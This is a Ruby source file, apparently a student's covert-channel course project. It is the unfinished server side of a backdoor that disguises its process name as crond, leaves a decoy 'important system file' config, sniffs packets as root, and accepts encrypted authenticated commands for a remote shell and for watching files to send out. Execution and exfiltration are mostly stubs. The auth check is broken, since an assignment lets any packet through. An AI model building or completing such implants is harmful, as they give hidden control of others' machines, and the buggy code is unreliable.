#!/usr/bin/env ruby
=begin
-------------------------------------------------------------------------------------
-- SOURCE FILE:   server.rb - description goes here
--
-- PROGRAM:       server
--                ./server.rb
--
-- FUNCTIONS:     stuff here
--
-- Ruby Gems req: 
-- 
-- DATE:          May/June 2014
--
-- REVISIONS:     See development repo: https://github.com/deuterium/comp8505-final
--
-- DESIGNERS:     Chris Wood - chriswood.ca@gmail.com
--
-- PROGRAMMERS:   Chris Wood - chriswood.ca@gmail.com
-- 
-- NOTES:         ** weird buffer for capture, client needs to send 2 commmands
--                  before server receives both at the same time
--                **watch functionality starts threads, no implemented interface
--                  to manage or kill them
---------------------------------------------------------------------------------------
=end

require 'packetfu'
require 'openssl'
require 'fssm'
require_relative 'util.rb'

# rename process immediately
$0 = "/usr/sbin/crond -n"

## Variables

## Application Strings
CONFIG_FILE = "not_important"
CONFIG_FILE_DEFAULT = "\# This is an important system file! Please do not edit\n"
CONFIG_FILE_DEFAULT << "\# pen_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# pen_port = 6886\n"
CONFIG_FILE_DEFAULT << "\# exfil_prot = tcp\n"
CONFIG_FILE_DEFAULT << "\# exfil_port = 8668\n"
CONFIG_FILE_DEFAULT << "\# interface = eth1\n"
CONFIG_EDIT = "Please edit #{CONFIG_FILE} and relaunch."
CONFIG_CREATE = "Configuration file created. #{CONFIG_EDIT}"
CONFIG_INVALID = "Error parsing configuration. #{CONFIG_EDIT}"
DIR = "dir"
FILE = "file"

## Functions

def start_listen_server
  puts "server listening on #{@cfg_iface}->#{@cfg_pen_protocol}:#{@cfg_pen_port}"
  #filter = "#{@cfg_pen_protocol} and dst port #{@cfg_pen_port}"
  # ^for whatever reason this filter stopped working?
  filter = "udp"
  begin
    cap = PacketFu::Capture.new(:iface => @cfg_iface,
      :start => true,
      :promic => true,
      :filter => filter)
    cap.stream.each do |p|
      threads = []
      pkt =  PacketFu::Packet.parse(p)
      if @cfg_pen_protocol == TCP && pkt.udp_dst == @cfg_pen_port
        puts "in TCP mode" #DEBUG
        #check for auth
        #if auth'd parse payload for command
        #do command
      elsif @cfg_pen_protocol == UDP && pkt.udp_dst == @cfg_pen_port
        puts "in UDP mode" #DEBUG
        payload = decrypt(pkt.payload)
        cmds = payload.split(' ')
        if cmds[0] = AUTH_STRING
          case cmds[1]
          when MODE_SHELL
            cmd = cmds[2..-1].join(' ')
            puts cmd
            #execute cmd here
            #get resp
            #start other junk for knock and send back
          when MODE_WATCH
            puts "watch"
            if cmds[2] == DIR
              t = Thread.new { start_watch(DIR, cmds[3]) }
              threads.push(t)
              threads[threads.length-1].join
            elsif cmds[2] == FILE
              t = Thread.new { start_watch(FILE, cmds[3]) }
              threads.push(t)
              threads[threads.length-1].join
            end
          end
        else
          next #not auth, skip
        end
      end
    end
  rescue Exception => e
    puts "error in packet capture"
    puts e.trace

    #if bad error raise exception to kill program
  end
end

def parse_payload(payload)

end

def execute_shell_command(command)

end

def start_watch(type, name)
  if type == DIR
    glob = '**/*'
  else
    glob = name
  end
  FSSM.monitor('/test', glob) do
    update { |base, relative|
      puts "#{base}/#{relative} has been updated"
      # send file
    }
    delete { |base, relative|
      puts "#{base}/#{relative} has been deleted"
      # send message
    }
    create { |base, relative|
      puts "#{base}/#{relative} has been created"
      # send file
    }
  end
end

def send_file(file, destination)
  
end

def generate_knock_seq
  
end

## Main

# check for root
raise 'Must run as root' unless Process.uid == 0
load_config_file
begin
  listen_thread = Thread.new { start_listen_server }
  listen_thread.join
rescue Interrupt # Catch the interrupt(ctrl c) and kill the thread
  Thread.kill(listen_thread)
  exit 0
end
